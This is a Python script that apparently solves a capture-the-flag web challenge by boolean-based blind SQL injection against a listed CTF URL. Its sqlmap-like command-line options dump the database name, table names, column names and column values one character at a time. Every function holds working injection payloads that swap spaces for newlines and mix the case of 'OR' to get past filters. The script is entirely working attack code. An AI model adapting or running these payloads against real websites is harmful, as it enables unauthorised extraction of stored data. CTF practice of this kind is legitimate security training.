#!/usr/bin/env python3
import requests
import sys


def get_cur_db_name():
    # get the current database name
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    db_name = []
    i = 1
    while True:
        # test if name[i]==''
        payload = "2' OR ORD(mid((select database()) from {} FOR 1))=0 OR '".format(i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            break

        # test each character
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            payload = "2' OR ORD(mid((select database()) from {} FOR 1))>{} OR '".format(i, middle)
            payload = payload.replace(r' ', '%0a')
            data = 'id=' + payload + '&submit=Submit+Query'
            r = requests.post(url=url, data=data, headers=header)
            r.encoding = r.apparent_encoding
            if r.text.find(true_condition) != -1:
                start = middle
            else:
                end = middle
            if start+1 == end:
                db_name.append(chr(end))
                break
        if end == 1:
            break
        i = i + 1
    db_name = ''.join(db_name)
    return db_name


def get_db_tables_names(db_name):
    # get the current database tables names
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    tables_names = []
    i = 1
    while True:
        # test if name[i]==''
        payload = "2' OR ORD(mid((select group_concat(table_name SEPARATOR ':') from infORmation_schema.tables where table_schema='{}') from {} FOR 1))=0 OR '".format(db_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            break

        # test if name[i] is the separator ':'
        payload = "2' OR ORD(mid((select group_concat(table_name SEPARATOR ':') from infORmation_schema.tables where table_schema='{}') from {} FOR 1))=58 OR '".format(db_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            tables_names.append(':')
            i = i + 1
            continue

        # test each character
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            payload = "2' OR ORD(mid((select group_concat(table_name SEPARATOR ':') from infORmation_schema.tables where table_schema='{}') from {} FOR 1))>{} OR '".format(db_name, i, middle)
            payload = payload.replace(r' ', '%0a')
            data = 'id=' + payload + '&submit=Submit+Query'
            r = requests.post(url=url, data=data, headers=header)
            r.encoding = r.apparent_encoding
            if r.text.find(true_condition) != -1:
                start = middle
            else:
                end = middle
            if start + 1 == end:
                tables_names.append(chr(end))
                break
        if end == 1:
            break
        i = i + 1
    tables_names = ''.join(tables_names)
    return tables_names


def get_db_table_columns_names(table_name):
    # get the current database tables columns_names
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    columns_names = []
    i = 1
    while True:
        # test if name[i]==''
        payload = "2' OR ORD(mid((select group_concat(column_name SEPARATOR ':') from infORmation_schema.columns where table_name='{}') from {} FOR 1))=0 OR '".format(table_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            break

        # test if name[i] is the separator ':'
        payload = "2' OR ORD(mid((select group_concat(column_name SEPARATOR ':') from infORmation_schema.columns where table_name='{}') from {} FOR 1))=58 OR '".format(table_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            columns_names.append(':')
            i = i + 1
            continue

        # test each character
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            payload = "2' OR ORD(mid((select group_concat(column_name SEPARATOR ':') from infORmation_schema.columns where table_name='{}') from {} FOR 1))>{} OR '".format(
                table_name, i, middle)
            payload = payload.replace(r' ', '%0a')
            data = 'id=' + payload + '&submit=Submit+Query'
            r = requests.post(url=url, data=data, headers=header)
            r.encoding = r.apparent_encoding
            if r.text.find(true_condition) != -1:
                start = middle
            else:
                end = middle
            if start + 1 == end:
                columns_names.append(chr(end))
                break
        if end == 1:
            break
        i = i + 1
    columns_names = ''.join(columns_names)
    return columns_names


def get_db_table_column_values(table_name, column_name):
    # get the current database table column values
    header = {'Content-Type': 'application/x-www-form-urlencoded'}
    values = []
    column_name = 'fL$4G'
    i = 1
    while True:
        # test if name[i]==''
        payload = "2' OR ORD(mid((select group_concat({} SEPARATOR ':') from {}) from {} FOR 1))=0 OR '".format(column_name, table_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            break

        # test if name[i] is the separator ':'
        payload = "2' OR ORD(mid((select group_concat({} SEPARATOR ':') from {}) from {} FOR 1))=58 OR '".format(column_name, table_name, i)
        payload = payload.replace(r' ', '%0a')
        data = 'id=' + payload + '&submit=Submit+Query'
        r = requests.post(url=url, data=data, headers=header)
        r.encoding = r.apparent_encoding
        if r.text.find(true_condition) != -1:
            values.append(':')
            i = i + 1
            continue

        # test each character
        start = 0
        end = 128
        while True:
            middle = int(start + (end - start) / 2)
            payload = "2' OR ORD(mid((select group_concat({} SEPARATOR ':') from {}) from {} FOR 1))>{} OR '".format(column_name, table_name, i, middle)
            payload = payload.replace(r' ', '%0a')
            data = 'id=' + payload + '&submit=Submit+Query'
            r = requests.post(url=url, data=data, headers=header)
            r.encoding = r.apparent_encoding
            if r.text.find(true_condition) != -1:
                start = middle
            else:
                end = middle
            if start + 1 == end:
                values.append(chr(end))
                break
        if end == 1:
            break
        i = i + 1
    values = ''.join(values)
    return values


if __name__ == '__main__':
    print("如果参数中有'$',请使用'\$'进行转义(linux中需要对'$'转义)")
    url = 'http://ctf5.shiyanbar.com/web/earnest/index.php'
    true_condition = 'You are in'
    cmd = sys.argv
    if cmd[1] == '--current-db':
        cur_db_name = get_cur_db_name()
        print('the name of the current database is {}'.format(cur_db_name))
    elif cmd[1] == '-D':
        db_name = cmd[2]
        if cmd[3] == '--tables':
            tables_names = get_db_tables_names(db_name).split(':')
            print('the tables_names of the {} are '.format(db_name), end='')
            for j in range(len(tables_names)):
                print(tables_names[j], end=',')
            print()
        elif cmd[3] == '-T':
            table_name = cmd[4]
            if cmd[5] == '--columns':
                columns_names = get_db_table_columns_names(table_name).split(':')
                print('the columns_names of the {} of the {} are '.format(table_name, db_name), end='')
                for j in range(len(columns_names)):
                    print(columns_names[j], end=',')
                print()
            elif cmd[5] == '-C':
                column_name = cmd[6]
                if cmd[7] == '--dump':
                    values = get_db_table_column_values(table_name, column_name).split(':')
                    print('the values of the {} of the {} of the {} are '.format(column_name, table_name, db_name),
                          end='')
                    for j in range(len(values)):
                        print(values[j], end=',')
                    print()
